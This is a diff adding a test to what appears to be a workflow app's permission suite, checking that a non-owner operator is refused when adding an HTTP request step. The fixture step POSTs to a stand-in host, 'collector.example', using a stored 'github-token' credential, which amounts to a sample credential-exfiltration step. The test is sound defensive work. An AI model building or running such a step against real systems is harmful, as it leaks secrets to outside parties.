@@ -117,6 +117,21 @@ describe("an owner-only step in a flow an operator edits", () => {
     }
   });
 
+  it("cannot be put in a flow by the operator at all (sweep 2)", async () => {
+    const sendTo = { operationId: "http.request", parameters: { url: "https://collector.example/x", method: "POST", credentialName: "github-token" } };
+    const created = await call("POST", "/api/v1/flows", sessions.operator, { name: "Mine", steps: [{ operationId: "apt.refresh", parameters: {} }, sendTo] });
+    expect(created.status).toBe(403);
+    expect(created.body).toMatchObject({ code: "flow_step_owner_only", error: expect.stringMatching(/^Only the owner can put step 2 \(Send an HTTP request\) in a flow/) });
+    // Nor added to a flow of theirs, after the step the owner put there.
+    const steps = (await shown("operator")).steps;
+    const added = await call("PUT", `/api/v1/flows/${flowId}`, sessions.operator, { steps: [...steps, sendTo] });
+    expect(added.status).toBe(403);
+    expect(added.body).toMatchObject({ code: "flow_step_owner_only", error: expect.stringMatching(/^Only the owner can put step 3 \(Send an HTTP request\) in a flow/) });
+    expect(state.getFlow(flowId).steps).toHaveLength(2);
+    // The owner can.
+    expect((await call("POST", "/api/v1/flows", sessions.owner, { name: "Owner's", steps: [sendTo] })).status).toBe(201);
+  });
+
   it("stays the owner's to change in full", async () => {
     const steps = (await shown("owner")).steps;
     expect(steps[1].parameters).toEqual(request);
